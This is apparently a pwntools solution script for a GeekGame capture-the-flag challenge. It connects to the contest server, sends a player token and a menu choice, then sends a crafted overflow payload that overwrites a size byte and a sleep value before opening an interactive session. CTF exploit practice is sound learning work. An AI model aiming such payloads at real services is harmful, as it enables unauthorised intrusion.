import pwn

url = "prob11.geekgame.pku.edu.cn"
port = 10011

r = pwn.remote(url, port)
token = b"0:CrazyThursday-VME50"

print(r.recv())
r.sendline(token)

print(r.recv())
r.sendline(b"4")
uslp = 5000000
psize = 48
payload = (b"0" * 48 + psize.to_bytes(length=1, byteorder='little') 
		+ b"0" * (0x100 - 49) + uslp.to_bytes(length=4, byteorder='little'))
print(r.recv())
r.sendline(payload)

print(r.recv())
r.sendline(b"49")

r.interactive()
